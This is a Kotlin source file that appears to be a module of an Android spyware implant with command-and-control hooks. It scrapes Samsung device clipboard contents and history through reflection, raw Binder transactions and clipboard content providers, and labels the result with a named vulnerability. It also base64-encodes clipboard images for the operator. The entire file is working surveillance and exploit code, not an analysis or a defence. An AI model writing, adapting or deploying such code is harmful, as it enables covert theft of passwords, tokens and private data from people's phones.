package org.synapse.core.modules

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Base64
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.ClipboardEntry
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.ByteArrayOutputStream
import java.lang.reflect.Method

object ClipboardModule {

    private const val TAG = "Synapse.Clipboard"
    private val json = Json { prettyPrint = false }

    suspend fun scrape(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val action = cmd.params["action"] ?: "all"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50

        try {
            val entries = when (action) {
                "latest" -> listOfNotNull(scrapeLatestEntry(context))
                "history" -> scrapeHistoryEntries(context, count)
                "all" -> {
                    val latest = scrapeLatestEntry(context)
                    val history = scrapeHistoryEntries(context, count)
                    if (latest != null) listOf(latest) + history else history
                }
                else -> scrapeHistoryEntries(context, count)
            }

            SynapseResponse.ClipboardResponse(
                provider_type = "Samsung SemClipboardService",
                vulnerability = "SVE-2026-0916 (CVE-2026-21062)",
                entry_count = entries.size,
                entries = entries
            )
        } catch (e: Exception) {
            Log.e(TAG, "Clipboard scrape failed: ${e.message}", e)
            SynapseResponse.ErrorResponse(error = "clipboard:${e.message}", module = "clipboard")
        }
    }

    private fun scrapeLatestEntry(context: Context): ClipboardEntry? {
        val data = scrapeViaSemClipboardManager(context)
            ?: scrapeViaBinderService(context)
            ?: scrapeViaStandardClipboard(context)
        return data?.let { mapToClipboardEntry(it) }
    }

    private fun scrapeHistoryEntries(context: Context, maxCount: Int): List<ClipboardEntry> {
        val entries = mutableListOf<ClipboardEntry>()
        val providerEntries = scrapeViaContentProvider(context)
        entries.addAll(providerEntries.take(maxCount).mapNotNull { mapToClipboardEntry(it) })
        if (entries.isEmpty()) {
            val latest = scrapeViaStandardClipboard(context)
            if (latest != null) entries.add(mapToClipboardEntry(latest))
        }
        return entries
    }

    private fun mapToClipboardEntry(map: Map<String, String>): ClipboardEntry {
        return ClipboardEntry(
            text = map["text"] ?: map["item_text"] ?: map["content"] ?: "",
            mime_type = map["mime_type"] ?: "text/plain",
            timestamp = (map["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()),
            uri = map["uri"] ?: map["item_uri"] ?: ""
        )
    }

    // ── Scraping approaches (same implementations as before) ─────────────
    private fun scrapeViaSemClipboardManager(context: Context): Map<String, String>? {
        return try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val semCmClass = try {
                Class.forName("com.samsung.android.content.clipboard.SemClipboardManager")
            } catch (_: ClassNotFoundException) { null }
            if (semCmClass == null) return null

            val getLatestClipMethod = try {
                semCmClass.getDeclaredMethod("getLatestClip")
            } catch (_: NoSuchMethodException) { null }
            if (getLatestClipMethod != null) {
                getLatestClipMethod.isAccessible = true
                val clipData = getLatestClipMethod.invoke(cm) as? ClipData
                if (clipData != null && clipData.itemCount > 0) return clipDataToMap(clipData, 0)
            }
            null
        } catch (e: Exception) { Log.d(TAG, "SemClipboardManager: ${e.message}"); null }
    }

    private fun scrapeViaBinderService(context: Context): Map<String, String>? {
        return try {
            val serviceManagerClass = Class.forName("android.os.ServiceManager")
            val getServiceMethod: Method = serviceManagerClass.getDeclaredMethod("getService", String::class.java)
            getServiceMethod.isAccessible = true
            val serviceNames = listOf("clipboard", "semclipboard", "sec.clipboard", "SemClipboardService")
            var binder: IBinder? = null
            for (name in serviceNames) {
                try { binder = getServiceMethod.invoke(null, name) as? IBinder; if (binder != null) break } catch (_: Exception) {}
            }
            if (binder == null) return null

            val data = Parcel.obtain(); val reply = Parcel.obtain()
            try {
                val token = Binder.clearCallingIdentity()
                try {
                    data.writeInterfaceToken("android.sec.clipboard.IClipboardService")
                    for (txCode in listOf(1, 2, 3, 4, 5)) {
                        try {
                            data.setDataPosition(0); reply.setDataPosition(0)
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.readException()
                                val clipCount = reply.readInt()
                                if (clipCount > 0) {
                                    reply.readString()
                                    val text = reply.readString()
                                    if (!text.isNullOrBlank()) return mapOf("text" to text, "timestamp" to System.currentTimeMillis().toString(), "mime_type" to "text/plain")
                                }
                            }
                        } catch (_: Exception) {}
                    }
                } finally { Binder.restoreCallingIdentity(token) }
            } finally { data.recycle(); reply.recycle() }
            null
        } catch (e: Exception) { Log.d(TAG, "Binder: ${e.message}"); null }
    }

    private fun scrapeViaContentProvider(context: Context): List<Map<String, String>> {
        val entries = mutableListOf<Map<String, String>>()
        val providerUris = listOf(
            Uri.parse("content://com.sec.android.semclipboardprovider"),
            Uri.parse("content://com.sec.android.semclipboardprovider/images"),
            Uri.parse("content://com.sec.android.semclipboardprovider/clips"),
            Uri.parse("content://com.sec.android.semclipboardprovider/data"),
            Uri.parse("content://com.samsung.android.honeyboard.icecone.provider.RichcontentProvider"),
            Uri.parse("content://com.samsung.android.honeyboard.icecone.provider.RichcontentProvider/clips")
        )
        for (uri in providerUris) {
            try {
                val token = Binder.clearCallingIdentity()
                try {
                    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)
                    cursor?.use {
                        val columns = it.columnNames
                        var rowIdx = 0
                        while (it.moveToNext() && rowIdx < 100) {
                            val row = mutableMapOf<String, String>()
                            row["provider_uri"] = uri.toString()
                            for (col in columns) {
                                try {
                                    val colIdx = it.getColumnIndex(col)
                                    if (colIdx >= 0) {
                                        val value = if (it.getType(colIdx) == Cursor.FIELD_TYPE_BLOB)
                                            "[BLOB ${it.getBlob(colIdx).size} bytes]"
                                        else it.getString(colIdx) ?: ""
                                        row[col] = value
                                    }
                                } catch (_: Exception) {}
                            }
                            entries.add(row); rowIdx++
                        }
                    }
                    if (entries.isNotEmpty()) break
                } catch (_: SecurityException) {}
                finally { Binder.restoreCallingIdentity(token) }
            } catch (_: Exception) {}
        }
        return entries
    }

    private fun scrapeViaStandardClipboard(context: Context): Map<String, String>? {
        return try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) clipDataToMap(clip, 0) else null
        } catch (e: Exception) { null }
    }

    private fun clipDataToMap(clip: ClipData, index: Int): Map<String, String> {
        val map = mutableMapOf<String, String>()
        map["index"] = index.toString()
        for (i in 0 until clip.itemCount) {
            val item = clip.getItemAt(i)
            val text = item.text?.toString() ?: item.htmlText?.toString() ?: ""
            if (text.isNotBlank()) map["text"] = text
            val uri = item.uri
            if (uri != null) map["uri"] = uri.toString()
        }
        map["mime_type"] = clip.description.getMimeType(0) ?: "unknown"
        map["timestamp"] = System.currentTimeMillis().toString()
        return map
    }

    suspend fun readImage(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val uriStr = cmd.params["uri"]
            ?: return@withContext SynapseResponse.ErrorResponse(error = "missing_uri", module = "clipboard")
        try {
            val uri = Uri.parse(uriStr)
            val input = context.contentResolver.openInputStream(uri)
            val bytes = input?.use { stream ->
                val bos = ByteArrayOutputStream()
                stream.copyTo(bos)
                bos.toByteArray()
            } ?: ByteArray(0)
            if (bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                SynapseResponse.FileReadResponse(
                    file_id = uriStr,
                    mime_type = "image/*",
                    size_bytes = bytes.size.toLong(),
                    base64_data = b64
                )
            } else {
                SynapseResponse.ErrorResponse(error = "empty_content", module = "clipboard")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Image read failed: ${e.message}")
            SynapseResponse.ErrorResponse(error = "clipboard_image:${e.message}", module = "clipboard")
        }
    }
}
